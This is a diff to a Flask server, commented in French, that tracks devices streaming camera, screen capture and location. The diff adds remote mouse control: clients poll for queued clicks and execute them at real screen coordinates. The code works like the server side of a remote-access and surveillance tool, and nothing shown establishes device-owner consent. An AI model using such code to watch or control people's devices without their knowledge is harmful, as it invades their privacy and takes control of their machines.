@@ -8,6 +8,10 @@ chacun par un device_id unique envoyé par client.py. Pour chaque appareil,
 DEUX flux indépendants sont suivis : la caméra et la capture d'écran.
 L'interface de contrôle (GUI) s'y connecte elle aussi en HTTP, même si
 elle n'est pas sur le même réseau Wi-Fi.
+
+Contrôle souris : le client remonte la position de sa souris (quand le
+flux écran est actif) et la GUI peut demander des clics aux coordonnées
+écran réelles ; chaque clic est mis en file et exécuté par le client.
 """
 
 import time
@@ -39,6 +43,7 @@ devices: dict[str, dict] = {}
 CLIENT_TIMEOUT_SECONDS = 10
 MAX_LONG_POLL_SECONDS = 3.0   # attente maximale d'une nouvelle image côté serveur
 STREAM_NAMES = ("camera", "screen")
+MAX_PENDING_CLICKS = 50       # garde-fou : si le client est déconnecté, on évite que la file grossisse sans fin
 
 
 @app.route("/health", methods=["GET"])
@@ -59,12 +64,22 @@ def _default_location_state() -> dict:
     }
 
 
+def _default_mouse_state() -> dict:
+    return {
+        "x": None, "y": None,
+        "screen_w": None, "screen_h": None,   # taille écran SOURCE (pour convertir les clics)
+        "ts": None,
+        "pending_clicks": [],                 # file de clics à exécuter par le client
+    }
+
+
 def _default_device_state(name: str | None) -> dict:
     return {
         "name": name or "Appareil inconnu",
         "last_seen": None,
         "streams": {stream: _default_stream_state() for stream in STREAM_NAMES},
         "location": _default_location_state(),
+        "mouse": _default_mouse_state(),
     }
 
 
@@ -95,7 +110,7 @@ def _device_is_alive(device: dict) -> bool:
 def get_command():
     """Le client interroge cette route régulièrement avec son device_id ;
     reçoit l'état voulu pour SES DEUX flux, PLUS la commande de localisation
-    (OPEN/CLOSE), en une seule requête.
+    (OPEN/CLOSE) et un éventuel clic souris en attente, en une seule requête.
 
     Au passage, le client signale via ?location_open=0|1 si SON navigateur
     de localisation est actuellement ouvert ou non (il peut avoir été fermé
@@ -115,6 +130,10 @@ def get_command():
 
         commands = {stream: device["streams"][stream]["command"] for stream in STREAM_NAMES}
         commands["location"] = device["location"]["command"]
+        # Un seul clic est transmis par poll : le client l'exécute, et le
+        # suivant sera servi au prochain tour (pas de rafale perdue).
+        pending = device["mouse"]["pending_clicks"]
+        commands["mouse_click"] = pending.pop(0) if pending else None
         return jsonify({"commands": commands})
 
 
@@ -527,6 +546,77 @@ def get_location_latest():
             "command": location["command"],
             "browser_open": location["browser_open"],
             "latest": location["latest"],
+        })
+
+
+# ---------------------------------------------------------------------
+# Souris : position remontée par le CLIENT, clics demandés par la GUI
+# ---------------------------------------------------------------------
+
+@app.route("/api/mouse/move", methods=["POST"])
+def mouse_move():
+    """Le client envoie la position courante de sa souris (et la taille de
+    son écran, pour que la GUI convertisse un clic sur l'image réduite en
+    coordonnées écran réelles)."""
+    payload = request.get_json(force=True, silent=True) or {}
+    device_id = payload.get("device_id")
+    x, y = payload.get("x"), payload.get("y")
+    if not device_id or x is None or y is None:
+        return jsonify({"error": "device_id, x et y requis"}), 400
+
+    with devices_lock:
+        device = _get_or_create_device(device_id)
+        device["last_seen"] = time.time()
+        mouse = device["mouse"]
+        mouse["x"], mouse["y"] = int(x), int(y)
+        if payload.get("screen_w") and payload.get("screen_h"):
+            mouse["screen_w"] = int(payload["screen_w"])
+            mouse["screen_h"] = int(payload["screen_h"])
+        mouse["ts"] = int(time.time() * 1000)
+    return jsonify({"ok": True})
+
+
+@app.route("/api/mouse/click", methods=["POST"])
+def mouse_click():
+    """La GUI demande un clic aux coordonnées ÉCRAN (celles de la capture
+    d'écran du client). Le clic est mis en file : le client le récupérera
+    au prochain poll de /api/command."""
+    payload = request.get_json(force=True, silent=True) or {}
+    device_id = payload.get("device_id")
+    x, y = payload.get("x"), payload.get("y")
+    if not device_id or x is None or y is None:
+        return jsonify({"error": "device_id, x et y requis"}), 400
+
+    with devices_lock:
+        device = devices.get(device_id)
+        if device is None:
+            return jsonify({"error": "appareil inconnu"}), 404
+        pending = device["mouse"]["pending_clicks"]
+        pending.append({"x": int(x), "y": int(y)})
+        # Garde-fou : si le client est déconnecté, on évite que la file ne
+        # grossisse indéfiniment (les clics seraient de toute façon obsolètes).
+        if len(pending) > MAX_PENDING_CLICKS:
+            device["mouse"]["pending_clicks"] = pending[-MAX_PENDING_CLICKS:]
+    return jsonify({"ok": True})
+
+
+@app.route("/api/mouse/latest", methods=["GET"])
+def mouse_latest():
+    """La GUI interroge cette route pour dessiner le curseur sur l'image
+    et convertir un clic en coordonnées écran réelles."""
+    device_id = request.args.get("device_id")
+    if not device_id:
+        return jsonify({"error": "device_id manquant"}), 400
+
+    with devices_lock:
+        device = devices.get(device_id)
+        if device is None:
+            return jsonify({"error": "appareil inconnu"}), 404
+        mouse = device["mouse"]
+        return jsonify({
+            "x": mouse["x"], "y": mouse["y"],
+            "screen_w": mouse["screen_w"], "screen_h": mouse["screen_h"],
+            "ts": mouse["ts"],
         })
 
 
